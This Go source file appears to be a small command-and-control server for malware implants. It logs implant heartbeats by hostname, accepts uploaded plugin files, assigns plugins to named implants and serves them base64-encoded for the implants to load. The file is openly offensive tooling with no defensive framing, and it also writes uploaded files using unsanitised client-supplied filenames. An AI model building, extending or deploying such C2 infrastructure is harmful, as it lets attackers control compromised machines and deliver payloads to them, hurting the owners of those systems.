package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"time"
)

// This server should:
// * Receive and handle connections from implant
// * Serve plugins to implants

type Implant struct {
	HostName           string
	LastKnownIp        string
	LastKnownHeartBeat time.Time
	PluginsToLoad      []PluginFromC2
}

type PluginFromC2 struct {
	PluginID   string `json:"pluginId"`
	PluginURL  string `json:"pluginUrl"`
	PluginName string `json:"pluginName"`
}

type KnownPlugin struct {
	PluginFilename string
	PluginName     string
}

var implants = map[string]Implant{}
var knownPlugins = map[string]string{}

func CheckError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

func RandomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyz0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

func postHeartbeat(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	CheckError(err)
	code := r.Form.Get("client_password")
	hostname := r.Form.Get("hostname")
	fmt.Println("Got client with code: " + code)
	if entry, ok := implants[hostname]; ok {
		entry.LastKnownHeartBeat = time.Now()
		implants[hostname] = entry
	} else {
		implants[hostname] = Implant{
			HostName:           hostname,
			LastKnownHeartBeat: time.Now(),
			PluginsToLoad:      make([]PluginFromC2, 0),
		}
	}
	pluginsToReturn := implants[hostname].PluginsToLoad
	jsonString, _ := json.Marshal(pluginsToReturn)
	fmt.Println(implants)
	io.WriteString(w, string(jsonString))
}

func postPlugin(w http.ResponseWriter, r *http.Request) {
	fmt.Printf("got plugin request\n")
	err := r.ParseForm()
	CheckError(err)
	pluginName := r.Form.Get("pluginName")
	fileName := knownPlugins[pluginName]
	content, err := ioutil.ReadFile(fileName) // the file is inside the local directory
	CheckError(err)
	str := base64.StdEncoding.EncodeToString(content)
	fmt.Println(str[:100])
	io.WriteString(w, str)
}

func postAddToKnownPlugins(w http.ResponseWriter, r *http.Request) {
	r.ParseMultipartForm(10 << 20) //10mb
	uploadPath := "./plugins"
	for k := range r.MultipartForm.File {
		// k is the key of file part
		file, fileHeader, err := r.FormFile(k)
		if err != nil {
			fmt.Println("inovke FormFile error:", err)
			return
		}
		defer file.Close()
		fmt.Printf("the uploaded file: name[%s], size[%d], header[%#v]\n",
			fileHeader.Filename, fileHeader.Size, fileHeader.Header)

		// store uploaded file into local path
		localFileName := uploadPath + "/" + fileHeader.Filename
		out, err := os.Create(localFileName)
		if err != nil {
			fmt.Printf("failed to open the file %s for writing", localFileName)
			return
		}
		defer out.Close()
		_, err = io.Copy(out, file)
		if err != nil {
			fmt.Printf("copy file err:%s\n", err)
			return
		}
		knownPlugins[r.PostForm.Get("pluginname")] = localFileName
		fmt.Printf("file %s uploaded ok\n", fileHeader.Filename)
		break //For now we only support one file
	}
	fmt.Println("KNOWN PLUGINS", knownPlugins)
	io.WriteString(w, "OK")
}

func postAddPluginToImplant(w http.ResponseWriter, r *http.Request) {
	err := r.ParseForm()
	CheckError(err)
	pluginName := r.Form.Get("pluginname")
	implantName := r.Form.Get("implantname")
	fmt.Println("Plugin and implant to be linked", pluginName, implantName)
	_, pluginOK := knownPlugins[pluginName]
	_, implantok := implants[implantName]
	if !pluginOK || !implantok {
		io.WriteString(w, "Plugin or implant unknown. Please fix.")
	} else {
		pluginToImplant := PluginFromC2{
			PluginID:   RandomString(16),
			PluginURL:  "http://localhost:3333/plugin/", //For now this is the only that is needed. Maybe change in the future
			PluginName: pluginName,
		}
		entry := implants[implantName]
		entry.PluginsToLoad = append(implants[implantName].PluginsToLoad, pluginToImplant)
		implants[implantName] = entry
		io.WriteString(w, "Added "+pluginName+" to "+implantName)
	}
}

func main() {
	http.HandleFunc("/", postHeartbeat)
	http.HandleFunc("/plugin/", postPlugin)
	http.HandleFunc("/addplugin/", postAddToKnownPlugins)
	http.HandleFunc("/linkimplantplugin/", postAddPluginToImplant)

	err := http.ListenAndServe(":3333", nil)
	CheckError(err)
}
